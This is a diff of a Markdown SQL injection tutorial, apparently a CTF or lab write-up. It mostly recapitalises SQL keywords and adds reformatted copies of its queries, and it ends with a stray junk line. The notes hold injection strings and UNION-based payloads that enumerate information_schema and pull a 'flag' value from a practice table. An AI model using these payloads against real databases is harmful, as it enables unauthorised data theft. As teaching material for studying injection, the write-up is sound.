@@ -21,17 +21,17 @@ def user_exists(username: str) -> bool:
 * attack is like this
 ```sql
 user_exists('test') #False
-#select id from users where username = 'test'
+#SELECT id from users WHERE username = 'test'
 
-user_exists("'; select 1=1; --") #True
-#select id from users where username = ''; select true; --'
+user_exists("'; SELECT 1=1; --") #True
+#SELECT id from users WHERE username = ''; SELECT true; --'
 ```
 
 ```sql
-'; select 1=1; -—
+'; SELECT 1=1; -—
 ```
 ```sql
-'; select 1=1; #
+'; SELECT 1=1; #
 ```
 ### Simplest injection
 ```sql
@@ -44,9 +44,9 @@ user_exists("'; select 1=1; --") #True
 when a web application show Direct result, we should use UNION Attack
 
 ```sql
-select * from news where news_id = $NEWSID;
-select * from news where news_id = '$NEWSID';
-select * from news where news_id = "$NEWSID";
+SELECT * from news WHERE news_id = $NEWSID;
+SELECT * from news WHERE news_id = '$NEWSID';
+SELECT * from news WHERE news_id = "$NEWSID";
 ```
 when a web application show Indirect result, 
 
@@ -76,31 +76,60 @@ We can confirm the SQLi when results of:
 ' order by 2 # ==> sql error so there was 1 column
 ```
 ```sql
-' union select 1#
-' union select group_concat(schema_name) FROM information_schema.schemata #
+' UNION SELECT 1#
+' UNION SELECT group_concat(schema_name) FROM information_schema.schemata #
 ```
  - database names is ==> information_schema,level2
 
 
 
 ```sql
-' union select group_concat(table_name) FROM information_schema.tables where table_schema='level2' #
+' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='level2' #
+```
+```sql
+SELECT
+	group_concat( table_name ) 
+FROM
+	information_schema.tables 
+WHERE
+	table_schema = 'level2'#
 ```
 or
 ```sql
-' union select group_concat(table_name) FROM information_schema.tables where table_schema=database() #
+' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() #
+```
+```sql
+SELECT 
+    group_concat(table_name)
+FROM
+    information_schema.tables
+WHERE
+    table_schema=database() #
 ```
  - level2 tables is ==> my_secret_table,users
 
 
-
 ```sql
-' union select group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name='my_secret_table' #
+' UNION SELECT group_concat( column_name ) FROM	information_schema.COLUMNS WHERE table_schema = DATABASE () AND table_name = 'my_secret_table' #
+```
+```sql
+SELECT
+	group_concat( column_name ) 
+FROM
+	information_schema.COLUMNS 
+WHERE
+	table_schema = DATABASE () 
+	AND table_name = 'my_secret_table' #
 ```
  - columns of my_secret_table is ==> flag
 
 
 ```sql
-' union select flag from level2.my_secret_table #
+' UNION SELECT flag from level2.my_secret_table #
 ```
 Now data is here
+
+
+<center><hr style="border:2px solid gray; width:60%; text-align:center"></center>
+
+asfddf
